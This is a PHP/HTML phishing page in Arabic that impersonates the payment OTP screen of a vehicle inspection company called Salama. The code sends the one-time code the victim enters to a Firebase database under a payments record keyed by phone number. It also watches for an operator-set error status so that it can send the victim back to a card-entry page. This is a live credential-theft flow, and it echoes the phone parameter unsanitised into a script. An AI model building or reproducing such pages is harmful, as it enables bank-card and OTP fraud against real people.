<?php
error_reporting(0);
$phone = isset($_GET['phone']) ? $_GET['phone'] : '';
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Verification - Salama</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --main-blue: #00acc1; --dark-blue: #2c3e50; --gold-btn: #fbb03b; --error-red: #ef4444; --footer-bg: #eeeeee; }
        body { font-family: 'Cairo', sans-serif; background-color: #f9fafb; margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }
        .content { flex: 1; display: flex; flex-direction: column; align-items: center; }
        .container { width: 100%; max-width: 400px; padding: 15px; box-sizing: border-box; }
        .header-img { width: 100%; display: block; margin-bottom: 15px; }
        
        .otp-card { background: #fff; border: 1px solid #eeeeee; border-radius: 20px; padding: 30px 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; width: 100%; box-sizing: border-box; }
        
        /* الصورة التي أرسلتها */
        .security-icon { width: 85px; margin-bottom: 15px; }

        .otp-card h2 { color: var(--dark-blue); font-size: 22px; margin: 0 0 10px 0; font-weight: 800; }
        .otp-card p { color: #6b7280; font-size: 14px; margin-bottom: 25px; line-height: 1.6; }
        
        /* المربع الواحد الاحترافي */
        .single-otp-input { 
            width: 100%; 
            padding: 15px; 
            border: 2px solid #e5e7eb; 
            border-radius: 12px; 
            font-size: 28px; 
            font-weight: 700; 
            text-align: center; 
            color: var(--dark-blue); 
            background: #fefefe; 
            outline: none; 
            transition: all 0.2s ease; 
            font-family: 'Tahoma', sans-serif; 
            letter-spacing: 12px; /* لتوسيع المسافة بين الأرقام */
            box-sizing: border-box;
        }
        .single-otp-input:focus { border-color: var(--main-blue); box-shadow: 0 0 0 4px rgba(0, 172, 193, 0.1); }

        .btn-confirm { background: var(--gold-btn); color: #fff; width: 100%; padding: 18px; border: none; border-radius: 14px; font-size: 20px; font-weight: 800; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(251, 176, 59, 0.3); margin-top: 25px; }
        .btn-confirm:hover { background: #e8a035; }
        
        .resend-box { margin-top: 25px; font-size: 14px; color: #9ca3af; }
        .resend-box span { color: var(--main-blue); cursor: pointer; font-weight: 700; text-decoration: underline; }

        /* الفوتر الرمادي بالإنجليزية [cite: 2026-02-20] */
        footer { background-color: var(--footer-bg); color: #777; text-align: center; padding: 25px 10px; font-size: 13px; border-top: 1px solid #ddd; width: 100%; font-family: sans-serif; box-sizing: border-box; }
    </style>
</head>
<body>

<div class="content">
    <img src="https://i.ibb.co/JRL1qXkP/Whats-App-Image-2024-09-05-at-8-51-55-AM.jpg" class="header-img">

    <div class="container">
        <div class="otp-card">
            <img src="https://i.ibb.co/VWbkStrM/IMG-1749.webp" class="security-icon" alt="Security">
            
            <h2>رمز التحقق الآمن</h2>
            <p>أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك لمتابعة الدفع لشركة <strong>Salama</strong></p>
            
            <form id="otp-form">
                <input type="tel" id="otp_code" class="single-otp-input" placeholder="******" maxlength="6" pattern="[0-9]*" inputmode="numeric" required>
                
                <button type="submit" class="btn-confirm">تأكيد الرمز وإتمام الدفع</button>
            </form>
            
            <div class="resend-box">لم تستلم الرمز بعد؟ <span>إعادة إرسال الرمز</span></div>
        </div>
    </div>
</div>

<footer>
    <div>Privacy Policy | Terms & Conditions | Help Center</div>
    <div style="margin-top:10px; font-weight:600;">All Rights Reserved to Salama Vehicle Inspection Company © 2026</div>
</footer>

<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
const firebaseConfig = { databaseURL: "YOUR_FIREBASE_URL" };
firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const pID = "<?php echo $phone; ?>";

document.getElementById('otp-form').onsubmit = function(e) {
    e.preventDefault();
    const otpValue = document.getElementById('otp_code').value;

    db.ref('payments/'+pID).update({
        otp: otpValue,
        status: 'pending_otp'
    }).then(()=> {
        // التحويل لصفحة اللودينج بجملة "جاري التحقق من OTP"
        window.location.href = "loading.php?phone="+pID+"&from=otp";
    });
};

// مراقبة الرفض للعودة لصفحة البطاقة [cite: 2026-02-18]
if(pID) {
    db.ref('payments/'+pID).on('value', (snapshot) => {
        if(snapshot.val() && snapshot.val().status === 'error') {
            window.location.href = "payment.php?phone="+pID;
        }
    });
}
</script>
</body>
</html>